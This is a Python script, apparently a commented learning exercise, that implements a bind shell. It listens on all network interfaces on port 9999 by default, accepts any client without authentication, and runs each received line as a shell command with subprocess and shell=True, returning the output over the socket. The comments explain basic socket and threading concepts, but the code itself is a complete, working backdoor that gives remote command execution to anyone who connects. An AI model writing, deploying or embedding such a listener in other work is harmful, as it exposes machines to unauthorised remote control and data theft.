import subprocess
import socket
import click
from threading import Thread

def run_cmd(cmd):
    output=subprocess.run(cmd ,stdout=subprocess.PIPE , stderr=subprocess.PIPE , shell=True)
    return output.stdout
#subprocess module allows you to run shell commands and manage external processes directly from your Python code.
#stdout=subprocess.PIPE ---->captures the output (instead of printing it to the screen).
#shell=True ---> instructs Python to execute the specified command through the system's shell


def handleinputfunction(app_socket):
    while True:
        parts=[]
        part=app_socket.recv(2048)
        parts.append(part)
        #This loop continues until the last byte of a received chunk is a newline character (\n).
        #chr(chunk[-1]) --> Converts the last byte into a string character.
        while len(part) != 0 and chr(part[-1]) != "\n" :
            #receive all of the incoming bytes from the connected client
            part=app_socket.recv(2048)
            parts.append(part)
        #convert the incoming bytes to a cmd string  
        # The code b"".join(parts) uses an empty bytes object (b"") as the separator. 
        # This means it joins all the byte chunks in the parts list together with nothing in between, creating one single bytes object. 
         
        cmd=(b"".join(parts)).decode()[:-1]
        """It’s doing 3 main things:
                    -Joining the byte chunks
                    -Decoding bytes to a string
                    -removing the last byte of the cmd string. This is a newline character stemming from hitting enter when typing the command.
                    """
        if cmd.lower() == "exit":
            app_socket.close()
            break
        #close down the connection if cmd is "exit",
        output = run_cmd(cmd)
        app_socket.sendall(output)
        #This function sends output to a connected socket

@click.command
@click.option("--port" , "-p" , default=9999)
def bshell(port):


    sk=socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    """The arguments passed to socket() are constants used to specify the address family and socket type. AF_INET is the Internet address 
    family for IPv4.SOCK_STREAM is the socket type for TCP, the protocol that will be used to transport messages in the network."""
   
    sk.bind(("0.0.0.0" , port))

    #The .bind() method is used to associate the socket with a specific network interface and port number.
    # 0.0.0.0 (all available interfaces)

    
    sk.listen(4)
    """".listen() enables a server to accept connections. It makes the server a listening socket , The .listen() method has 
    a backlog parameter. It specifies the number of unaccepted connections that the system will allow before refusing new connections."""
    while True:
         
         app_socket , address = sk.accept()
         thrd=Thread(target=handleinputfunction , args=(app_socket,))
         #Each new client connection is handled in a separate thread
         #This allows multiple clients to connect and interact with the server simultaneously
         thrd.start()
         #Starts the thread — handleinputfunction will run in the background
#Only run this block if this file is being run directly, not if it's being imported as a module.
#We are using click to create a command-line interface. click.command() turns the main() function into a command-line tool.
# But that tool only works if you explicitly call the function from somewhere
if __name__ == "__main__" :
    bshell()
    
